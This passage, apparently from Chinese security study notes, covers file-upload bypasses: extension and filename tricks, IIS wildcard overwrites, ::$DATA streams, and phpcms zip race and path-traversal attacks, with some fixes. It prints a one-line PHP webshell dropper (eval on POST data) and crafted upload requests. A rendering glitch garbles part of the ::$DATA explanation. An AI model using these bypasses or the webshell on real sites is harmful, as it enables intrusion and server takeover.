.gif|.jpg|.png</p>\n<p>content-type 检测 image/jpeg  image/png  image/gif</p>\n<p>黑名单过滤：限制 php，asp，jsp，jspx</p>\n<p>exif_imagetype 文件头检测</p>\n<p>二次渲染</p>\n<p>先判断在上传</p>\n<p>随机方式重命名</p>\n<p>文件夹取消执行权限</p>\n<p>在临时文件夹解压</p>\n</blockquote>\n<blockquote>\n<p>绕过办法：</p>\n<p>1. 文件大小写绕过（Php ，PhP pHp，等）</p>\n<p>2. 黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\\x00hh\\x46php</p>\n<p>3. 特殊文件名绕过<br>\n 1）修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格) 由于这种命名格式在<br>\n windows 系统里是不允许的，所以在绕过上传之后 windows 系统会自动去掉。点和空格。Linux 和<br>\n Unix 中没有这个特性。<br>\n2）::$DATA (php 在 windows 的时候如果文件名 +&quot;::DATA&quot; 会把::DATA 之后的数据当作文件流处<br>\n理，不会检测后缀名，且保持 &quot;::DATA&quot; 之前的文件名，其目的就是不检查后缀名)</p>\n<p>4.0x00 截断绕过（5.2 C 语言中将 \\0 当作字符串的结尾）</p>\n<p>5.htaccess 文件攻击（结合黑名单攻击）</p>\n<p>6. 解析绕过</p>\n<p>7. 修改 content-type 字段</p>\n<p>8. 关闭浏览器 js</p>\n<p>9. 使用图片马配合文件包含</p>\n<p>10. 修改文件头</p>\n<p>JPG<br>\n <code>FF D8 FF E0 00 10 4A 46 49 46</code></p>\n<p>GIF<br>\n <code>47 49 46 38 39 61</code></p>\n<p>(相当于文本的 GIF89a)</p>\n<p>PNG<br>\n <code>89 50 4E 47</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/9113969-cf4c7c27a2bea500.png\" alt=\"img\"></p>\n</blockquote>\n<h2 id=\"phpiiswindows-文件上传\"><a class=\"markdownIt-Anchor\" href=\"#phpiiswindows-文件上传\">#</a> php+IIS+Windows 文件上传</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//U-Mail demo ...</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;filename&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[^\\w]/i&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$filename</span>);  <span class=\"comment\">//过滤除了a-zA-Z0-9以外的内容</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];    <span class=\"comment\">//file中name</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;;&#x27;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$upfile</span>);   <span class=\"comment\">//过滤; 防止截断</span></span><br><span class=\"line\">    <span class=\"variable\">$upfile</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/[^(\\w|\\:|\\$|\\.|\\&lt;|\\&gt;)]/i&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$upfile</span>);   <span class=\"comment\">//只能出现a-zA-Z0-9:$.&lt;&gt;</span></span><br><span class=\"line\">    <span class=\"variable\">$tempfile</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"title function_ invoke__\">get_extension</span>(<span class=\"variable\">$upfile</span>)); </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;php3&#x27;</span>,<span class=\"string\">&#x27;php5&#x27;</span>)))&#123;   <span class=\"comment\">//过滤php35</span></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Warning ! File type error..&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;asp&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;asa&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;cer&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;cdx&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;aspx&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable\">$ext</span> == <span class=\"string\">&#x27;htaccess&#x27;</span>) <span class=\"variable\">$ext</span> = <span class=\"string\">&#x27;file&#x27;</span>;</span><br><span class=\"line\">  <span class=\"comment\">//$savefile = &#x27;upload/&#x27;.$upfile;</span></span><br><span class=\"line\">    <span class=\"variable\">$savefile</span> = <span class=\"string\">&#x27;upload/&#x27;</span>.<span class=\"variable\">$filename</span>.<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$ext</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$tempfile</span>,<span class=\"variable\">$savefile</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Success upload..path :&#x27;</span>.<span class=\"variable\">$savefile</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Upload failed..&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_extension</span>(<span class=\"params\"><span class=\"variable\">$file</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$file</span>, <span class=\"title function_ invoke__\">strrpos</span>(<span class=\"variable\">$file</span>, <span class=\"string\">&#x27;.&#x27;</span>)+<span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">  &lt;form method=<span class=\"string\">&quot;post&quot;</span> action=<span class=\"string\">&quot;upfile.php&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;file&quot;</span> value=<span class=\"string\">&quot;&quot;</span>/&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;hidden&quot;</span> name=<span class=\"string\">&quot;filename&quot;</span> value=<span class=\"string\">&quot;file&quot;</span>/&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;submit&quot;</span> name=<span class=\"string\">&quot;submit&quot;</span> value=<span class=\"string\">&quot;upload&quot;</span>/&gt;</span><br><span class=\"line\">  &lt;/form&gt;</span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>前置知识 1.</p>\n<p>php 可以使用 <code>%00</code>  截断，也可以使用 <code>:</code>  截断，但：截断后文件内容是空的</p>\n<p>(我看人家说用 #? 这两个字符也能截断… 我觉得不太对)</p>\n<p>前置知识 2.</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Windows</span>+<span class=\"variable constant_\">IIS</span>+<span class=\"variable constant_\">PHP</span>下</span><br><span class=\"line\">双引号(<span class=\"string\">&quot;“&quot;</span>) &lt;==&gt; 点号(<span class=\"string\">&quot;.&quot;</span>)<span class=\"string\">&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">大于符号(&quot;&gt;&quot;) &lt;==&gt; 问号(&quot;?&quot;)&#x27;</span>;</span><br><span class=\"line\">小于符号(<span class=\"string\">&quot;&lt;&quot;</span>) &lt;==&gt; 星号(<span class=\"string\">&quot;*&quot;</span>)<span class=\"string\">&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">上述是等价的，但*又可以做通配符使用，因此我们可以使用&lt;作为通配符</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"利用覆盖生成文件\"><a class=\"markdownIt-Anchor\" href=\"#利用覆盖生成文件\">#</a> 利用：覆盖生成文件</h3>\n<p>先安装 IIS 和对应的管理工具</p>\n<p>1) 首先利用冒号生成我们将要覆盖的 php 文件，这里为：bypass.php，抓包将其改为 bypass.php:jpg</p>\n<p>此时会覆盖文件，文件上传后的文件名为 bypass.php，大小为 0kb</p>\n<p>2) 利用上面的系统特性覆盖该文件</p>\n<p>从上面已经知道 &quot;&lt;&quot; 就等于 “ <code>*</code> ”, 而 &quot; <code>*</code> &quot; 代码任意字符，于是乎… 我们可以这样修改上传的文件名</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------<span class=\"title class_\">WebKitFormBoundaryaaRARrn2LBvpvcwK</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Disposition</span>: form-data; name=<span class=\"string\">&quot;file&quot;</span>; filename=<span class=\"string\">&quot;bypass.&lt;&lt;&lt;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Type</span>: image/jpeg</span><br></pre></td></tr></table></figure>\n<p>此时即可覆盖 bypass.php，同时文件内容被成功写了进去，后面就可以在内容中写 php 代码</p>\n<h3 id=\"通过默认数据流上传php文件\"><a class=\"markdownIt-Anchor\" href=\"#通过默认数据流上传php文件\">#</a> 通过默认数据流上传 php 文件</h3>\n<p>抓包，修改文件名，在结尾添加::$DATA</p>\n<p>The default data stream has no name. That is, the fully qualified name for the default stream for a file called “sample.txt” is “sample.txt::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><mi>i</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi mathvariant=\"normal\">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mi mathvariant=\"normal\">&quot;</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant=\"normal\">&quot;</mi></mrow><annotation encoding=\"application/x-tex\">DATA&quot; since &quot;sample.txt&quot; is the name of the file and &quot;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">&quot;</span></span></span></span>DATA” is the stream type</p>\n<p>默认数据流没有名称。也就是说，名为 “sample.txt” 的文件的默认流的完全限定名是 “sample.txt:：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>”，因为“</mtext><mi>s</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi mathvariant=\"normal\">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mtext>”是文件名，“</mtext></mrow><annotation encoding=\"application/x-tex\">DATA”，因为“sample.txt”是文件名，“</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord\">”</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">因</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord\">“</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">”</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord\">“</span></span></span></span>DATA” 是流类型</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------<span class=\"title class_\">WebKitFormBoundaryaaRARrn2LBvpvcwK</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Disposition</span>: form-data; name=<span class=\"string\">&quot;file&quot;</span>; filename=<span class=\"string\">&#x27;DataStreamTest.php::$DATA&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Type</span>: image/jpeg</span><br></pre></td></tr></table></figure>\n<p>成功上传后缀为 php 的文件</p>\n<h2 id=\"phpcms文件上传四次绕过\"><a class=\"markdownIt-Anchor\" href=\"#phpcms文件上传四次绕过\">#</a> phpcms 文件上传四次绕过</h2>\n<p>1. 只能上传压缩文件，上传后解压，判断文件后缀，删除非法文件</p>\n<p>没有递归删除文件，导致可以构造文件夹，文件夹中放非法文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_dir($<span class=\"built_in\">dir</span>)&#123;</span><br><span class=\"line\">    $handle = opendir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(($f = readdir($handle)) !== false)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array($f, array(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;..&#x27;</span>)))&#123;</span><br><span class=\"line\">            $ext = strtolower(substr(strrchr($f, <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!in_array($ext, array(<span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">                unlink($<span class=\"built_in\">dir</span>.$f);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>修复：递归删除</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//递归删除</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_dir</span>(<span class=\"params\"><span class=\"variable\">$dir</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$handle</span> = <span class=\"title function_ invoke__\">opendir</span>(<span class=\"variable\">$dir</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((<span class=\"variable\">$f</span> = <span class=\"title function_ invoke__\">readdir</span>(<span class=\"variable\">$handle</span>)) !== <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$f</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;..&#x27;</span>)))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>))&#123;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">check_dir</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>.<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">             &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$f</span>, <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>));</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">                    <span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>2. 先解压再删除，条件竞争，通过上传后没有删除的短暂时间内访问该文件，在该文将上一级目录写马</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(in_array($ext, array(<span class=\"string\">&#x27;zip&#x27;</span>, <span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($ext == <span class=\"string\">&#x27;zip&#x27;</span>)&#123;</span><br><span class=\"line\">        $archive = new PclZip($file[<span class=\"string\">&#x27;tmp_name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">               exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        check_dir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">        exit(<span class=\"string\">&#x27;上传成功!&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>通过 BP 一边一直上传，一边一直访问上传文件，上传的文件使用 fputs 在上级写马</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php fputs(fopen(<span class=\"string\">&#x27;../../../../../shell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php phpinfo();eval($_POST[a]);?&gt;&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>\n<p>修复：通过上传文件夹名为随机文件名来禁止访问</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_dir($<span class=\"built_in\">dir</span>))&#123;</span><br><span class=\"line\">    mkdir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">$temp_dir = $<span class=\"built_in\">dir</span>.md5(time(). rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>));</span><br><span class=\"line\">$temp_dir = $<span class=\"built_in\">dir</span>.<span class=\"string\">&#x27;member/1/&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!is_dir($temp_dir))&#123;</span><br></pre></td></tr></table></figure>\n<p>3. 通过解压失败直接退出绕过。构造可以解压一半的压缩包，把木马解压后再失败退出。目录通过右键查看图片链接获得</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">       exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修复：退出之前递归删除</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">       check_dir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">       exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这边详细讲一下怎么构造只能解压一部分的压缩包</p>\n<ol>\n<li>使用 Windows 下的 7zip</li>\n</ol>\n<p>修改压缩包里文件的 CRC 校验码</p>\n<p>先准备两个文件，一个 PHP 文件 1.php，一个文本文件 2.txt，其中 1.php 是 webshell。然后将这两个文件压缩成 shell.zip。 然后我们用 010editor 打开 shell.zip，可以看到右下角有这个文件的格式信息，它被分成 5 部分，如图 1。我们打开第 4 部分，其中有个 deCrc，我们随便把值改成其他的值，然后保存。</p>\n<ol start=\"2\">\n<li>使用 PHP 自带的 ZipArchive 库</li>\n</ol>\n<p>Windows 下不允许文件名中包含冒号（:），我们就可以在 010editor 中将 2.txt 的 deFileName 属性的值改成 “2.tx:”</p>\n<p>在 Linux 下也有类似的方法，我们可以将文件名改成 5 个斜杠（/////）</p>\n<p>4. 把压缩包中某文件名改成…/…/…/…/…/index.php，解压后文件直接到网站根目录</p>\n<p>注意修改文件名后文件名长度不变</p>\n<p>5. 通过验证文件名中不包含 <code>../</code>  并且文件名需要为 jpg</p>\n<p>通过构造 1.php;1.jpg</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foreach ($content <span class=\"keyword\">as</span> $t) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (strpos($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== FALSE) &#123;</span><br><span class=\"line\"><span class=\"meta\">                @unlink(<span class=\"params\">$filename</span>);</span></span><br><span class=\"line\">                exit(function_exists(<span class=\"string\">&#x27;iconv&#x27;</span>) ? iconv(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;非法名称的文件&#x27;</span>) : <span class=\"string\">&#x27;llegal name file&#x27;</span>);</span><br><span class=\"line\">            